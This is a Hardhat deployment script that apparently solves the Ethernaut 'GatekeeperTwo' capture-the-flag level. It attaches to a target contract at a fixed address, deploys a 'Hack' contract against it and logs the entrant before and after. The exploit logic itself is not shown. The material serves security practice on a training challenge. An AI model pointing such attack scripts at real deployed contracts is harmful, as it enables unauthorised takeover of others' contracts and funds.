// We require the Hardhat Runtime Environment explicitly here. This is optional
// but useful for running the script in a standalone fashion through `node <script>`.
//
// When running the script with `npx hardhat run <script>` you'll find the Hardhat
// Runtime Environment's members available in the global scope.
const hre = require("hardhat");

async function main() {
  // 🔨 Get accounts
  let [hacker, _, tester] = await hre.ethers.getSigners();
  // hacker = tester;
  let deployer = hacker;

  // 🗣 Logging addresses
  console.log(`🤓 Hacker address:\n ${hacker.address} \n`);

  // 📗 Contract name and address that will be hacked
  const contractName = "GatekeeperTwo";
  const contractAddress = "0x82Ab10d0A58Cd69a6626bbe07E86206dC4Ea2960";

  const contract = await hre.ethers.getContractAt(
    contractName,
    contractAddress
  );

  // 👿 Hacking the contract
  // 🗣 Logging status
  console.log(`🔑 Entrant: \n${await contract.entrant()}\n`);

  // 📕 Contract that will execute the hack
  const HackContract = await ethers.getContractFactory(
    "Hack" + contractName,
    hacker
  );
  const hackContract = await HackContract.connect(hacker).deploy(
    contract.address
  );
  await hackContract.deployed();

  // 🗣 Logging contracts addresses
  console.log(`📗 ${contractName}.sol address: \n${contract.address}\n`);
  console.log(
    `📕 Hack${contractName}.sol address: \n${hackContract.address}\n`
  );

  // 🗣 Logging status
  console.log(`🔑 Entrant: \n${await contract.entrant()}\n`);
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
